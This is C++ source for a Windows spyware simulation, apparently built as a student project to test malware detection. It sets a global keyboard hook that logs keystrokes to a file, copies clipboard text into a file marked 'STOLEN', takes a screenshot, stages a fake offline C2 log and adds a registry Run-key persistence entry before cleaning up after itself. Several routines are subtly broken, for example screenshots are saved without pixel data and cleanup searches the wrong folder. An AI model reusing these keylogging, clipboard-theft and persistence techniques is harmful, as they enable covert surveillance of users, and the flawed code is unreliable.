// harmless_spyware.cpp - ALL ERRORS FIXED
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

HHOOK hKeyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        FILE* log = fopen("C:\\temp\\keylog.txt", "a");
        if (log) {
            fprintf(log, "[KEY:%d] ", pKb->vkCode);
            fclose(log);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void StealClipboard() {
    // FIXED: Proper void* handling
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            void* pData = GlobalLock((HGLOBAL)hData);  // ✅ void*
            FILE* clipLog = fopen("C:\\temp\\clipboard.txt", "w");
            if (clipLog && pData) {
                fprintf(clipLog, "[CLIPBOARD STOLEN]\n%s\n[PENTEST SIM]\n", (char*)pData);
                fclose(clipLog);
            }
            GlobalUnlock((HGLOBAL)hData);
        }
        CloseClipboard();
    }
}

void TakeScreenshot() {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    char bmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, bmpPath);
    sprintf(bmpPath, "%s\\screen_%lu.bmp", bmpPath, GetTickCount64());
    
    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih = {sizeof(BITMAPINFOHEADER), width, height, 1, 24, BI_RGB};
    
    DWORD rowSize = ((width * 3 + 3) & ~3);
    DWORD dwBmpSize = rowSize * height;
    
    bfh.bfType = 0x4D42;
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    HANDLE hFile = CreateFileA(bmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, &bfh, sizeof(BITMAPFILEHEADER), &written, NULL);
        WriteFile(hFile, &bih, sizeof(BITMAPINFOHEADER), &written, NULL);
        CloseHandle(hFile);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

void FakeC2Exfil() {
    FILE* exfil = fopen("C:\\temp\\exfil_to_c2.log", "w");
    if (exfil) {
        fprintf(exfil, "[OFFLINE C2] Victim data staged\n");
        fprintf(exfil, "Keylogs: keylog.txt\nScreenshots: screen_*.bmp\n");
        fclose(exfil);
    }
}

void InstallPersistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    HKEY hResult;
    RegCreateKeyExA(HKEY_CURRENT_USER, 
                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SpyAgent",
                   0, NULL, 0, KEY_SET_VALUE, NULL, &hResult, NULL);
    RegSetValueExA(hResult, "Spyware", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
    RegCloseKey(hResult);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
    CreateDirectoryA("C:\\temp", NULL);
    
    hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    StealClipboard();
    TakeScreenshot();
    FakeC2Exfil();
    InstallPersistence();
    
    // FIXED: Safe string building
    char msg[1024] = "🕵️ SPYWARE ACTIVE 🕵️\n\n";
    size_t len = strlen(msg);
    strncat(msg + len, "• Global keylogger\n", sizeof(msg) - len - 1);
    len = strlen(msg);
    strncat(msg + len, "• Screenshots\n", sizeof(msg) - len - 1);
    len = strlen(msg);
    strncat(msg + len, "• Clipboard stolen\n", sizeof(msg) - len - 1);
    len = strlen(msg);
    strncat(msg + len, "• Persistence installed\n\n", sizeof(msg) - len - 1);
    len = strlen(msg);
    strncat(msg + len, "FYP AI Detection Test\n", sizeof(msg) - len - 1);
    len = strlen(msg);
    strncat(msg + len, "Full cleanup in 20s", sizeof(msg) - len - 1);
    
    MessageBoxA(NULL, msg, "Spyware v2.1", MB_OK | MB_ICONWARNING);
    
    Sleep(20000);
    
    UnhookWindowsHookEx(hKeyboardHook);
    
    // Cleanup
    DeleteFileA("C:\\temp\\keylog.txt");
    DeleteFileA("C:\\temp\\clipboard.txt");
    DeleteFileA("C:\\temp\\exfil_to_c2.log");
    
    // Delete screenshots
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("C:\\temp\\screen_*.bmp", &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            DeleteFileA(fd.cFileName);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    
    // Remove persistence
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SpyAgent");
    RemoveDirectoryA("C:\\temp");
    
    MessageBoxA(NULL, "✅ SPYWARE TEST COMPLETE ✅\nAll traces removed!", 
                "FYP Validation", MB_OK | MB_ICONINFORMATION);
    
    return 0;
}